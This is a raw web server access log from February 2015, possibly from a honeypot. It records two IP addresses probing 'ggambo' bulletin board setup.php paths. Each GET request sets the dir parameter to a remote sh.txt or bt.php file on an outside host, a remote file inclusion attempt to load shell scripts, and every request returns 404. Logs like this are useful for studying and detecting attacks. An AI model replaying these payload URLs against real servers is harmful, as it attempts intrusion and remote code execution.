1.224.163.80 - - [10/Feb/2015:11:48:27 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:11:48:29 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:11:48:29 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
1.224.163.80 - - [10/Feb/2015:11:48:31 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
181.65.186.35 - - [10/Feb/2015:11:50:35 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:50:36 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:50:37 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:50:38 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
1.224.163.80 - - [10/Feb/2015:11:51:35 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:51:36 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:51:36 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
1.224.163.80 - - [10/Feb/2015:11:51:38 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5" 
181.65.186.35 - - [10/Feb/2015:11:52:05 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:52:16 -0800] "GET /honeypot////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:52:16 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:52:18 -0800] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:52:18 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
181.65.186.35 - - [10/Feb/2015:11:52:21 -0800] "GET ////bbs/skin/ggambo6000_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0" 
